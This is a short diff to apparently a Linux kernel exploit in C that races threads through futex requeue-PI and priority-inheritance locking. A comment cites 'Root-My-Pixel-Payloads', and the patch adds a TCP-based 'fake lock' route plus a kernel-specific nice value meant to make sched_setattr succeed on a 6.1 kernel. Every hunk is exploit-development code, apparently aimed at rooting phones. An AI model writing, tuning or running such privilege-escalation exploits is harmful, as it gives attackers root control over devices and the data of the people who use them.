@@ -217,7 +217,11 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  do_pselect_fake_lock_route();
+  if (tcp_route_selected()) {
+    do_tcp_fake_lock_route();
+  } else {
+    do_pselect_fake_lock_route();
+  }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -262,7 +266,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         atomic_fetch_add(&consumer_calls, 1);
         atomic_store(&consumer_inflight, 1);
         errno = 0;
-        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+        /* dynamic nice from Root-My-Pixel-Payloads src/61: (calls%19)+1 is proven to make
+         * sched_setattr succeed on 6.1 compact. */
+        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
+                                ? (calls_this_seq % 19) + 1
+                                : PSELECT_CONSUMER_NICE;
+        long sched_ret = sched_setattr_tid(tid, consumer_nice);
         if (sched_ret != 0) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
           long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
